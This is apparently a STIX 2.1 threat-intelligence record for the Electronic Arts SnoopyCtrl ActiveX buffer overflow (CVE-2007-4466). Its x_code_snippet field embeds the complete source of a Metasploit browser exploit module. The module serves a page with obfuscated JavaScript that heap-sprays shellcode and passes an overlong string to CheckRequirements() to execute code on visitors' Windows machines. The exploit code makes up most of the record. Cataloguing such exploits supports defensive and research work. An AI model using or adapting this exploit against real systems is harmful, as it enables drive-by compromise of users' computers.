{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aeba7329-a97c-4005-a8a0-75ef012de706",
    "created": "2024-08-14T16:40:42.292621Z",
    "modified": "2024-08-14T16:40:42.292625Z",
    "name": "Electronic Arts SnoopyCtrl ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Electronic Arts SnoopyCtrl ActiveX Control (NPSnpy.dll 1.1.0.36. When sending an overly long string to the CheckRequirements() method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ea_checkrequirements.rb",
            "external_id": "ea_checkrequirements.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-4466"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Electronic Arts SnoopyCtrl ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Electronic Arts SnoopyCtrl\n        ActiveX Control (NPSnpy.dll 1.1.0.36. When sending an overly long\n        string to the CheckRequirements() method, an attacker may be able\n        to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-4466' ],\n          [ 'OSVDB', '37723'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]\n        ],\n      'DisclosureDate' => '2007-10-08',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, \"or al, 12\").encode_string * 2)\n\n    js = %Q|\n      try {\n        var evil_string = \"\";\n        var index;\n        var vulnerable = new ActiveXObject('SnoopyX.SnoopyCtrl.1');\n        var my_unescape = unescape;\n        var shellcode = '#{shellcode}';\n        #{js_heap_spray}\n        sprayHeap(my_unescape(shellcode), 0x0c0c0c0c, 0x40000);\n        for (index = 0; index < 5000; index++) {\n          evil_string = evil_string + my_unescape('#{ret}');\n        }\n        vulnerable.CheckRequirements(evil_string);\n      } catch( e ) { window.location = 'about:blank' ; }\n    |\n\n    opts = {\n      'Strings' => true,\n      'Symbols' => {\n        'Variables' => [\n          'vulnerable',\n          'shellcode',\n          'my_unescape',\n          'index',\n          'evil_string',\n        ]\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.update_opts(js_heap_spray.opts)\n    js.obfuscate(memory_sensitive: true)\n    content = %Q|<html>\n<body>\n<script><!--\n#{js}\n//</script>\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-08",
    "x_mitre_platforms": [
        "win'"
    ]
}